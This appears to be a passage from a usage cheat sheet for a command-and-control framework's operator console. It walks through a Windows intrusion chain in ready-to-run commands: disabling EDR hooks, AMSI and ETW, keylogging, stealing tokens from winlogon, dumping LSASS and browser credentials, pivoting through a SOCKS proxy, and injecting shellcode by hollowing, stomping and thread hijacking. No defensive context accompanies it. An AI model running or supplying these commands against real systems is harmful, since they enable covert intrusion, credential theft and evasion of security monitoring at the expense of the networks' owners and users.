./bin/operator console --server http://192.168.1.10:8080
> agents list
> agents info <id>
> shell <id>

# ── Team server ────────────────────────────────────────────────────
team claim <id>             # Claim agent (block other operators)
team release <id>           # Release agent
team claims                 # List all active claims

# ── OPSEC first ────────────────────────────────────────────────────
evasion unhook <id> --wait          # Remove EDR hooks
bypass amsi <id> --wait             # Patch AMSI
bypass etw <id> --wait              # Patch ETW
opsec antidebug <id>                # Verify no debugger
opsec antivm <id>                   # Verify not VM

# ── Recon ──────────────────────────────────────────────────────────
screenshot <id> --save /tmp/ss.png
keylog start <id> --duration 120
keylog dump <id>
recon scan <id> --subnet 192.168.1.0/24
recon arp <id>
registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# ── Privilege escalation ───────────────────────────────────────────
token list <id>
token steal <id> --pid <winlogon_pid>

# ── Credential access ──────────────────────────────────────────────
creds lsass <id> --output C:\Temp\ls.dmp --wait
files download <id> C:\Temp\ls.dmp /tmp/lsass.dmp
creds browser <id> --wait
creds clipboard <id>

# ── Lateral movement ───────────────────────────────────────────────
token make <id> --user Admin --domain CORP --pass "P@ss"
inject ppid <id> C:\Windows\System32\cmd.exe --ppid-name explorer.exe

# ── Pivot ──────────────────────────────────────────────────────────
pivot start <id> --port 1080        # SOCKS5 in-process proxy
# proxychains nmap -sT 10.10.10.0/24

# ── Injection (stealthiest first) ──────────────────────────────────
mapinject <id> --file sc.bin --pid <pid>   # No WriteProcessMemory
hollow <id> --file sc.bin                   # New suspended process
stomp <id> --file sc.bin --dll scrrun.dll   # Overwrite legit DLL
hijack <id> --file sc.bin --pid <pid>       # Existing thread RIP

# ── BOF ────────────────────────────────────────────────────────────
bof <id> whoami.o --wait
bof <id> sc_query.o --wait

# ── Cleanup ────────────────────────────────────────────────────────
token revert <id>
persistence remove <id> --method registry_run --name "WinUpdate"
pivot stop <id>
```
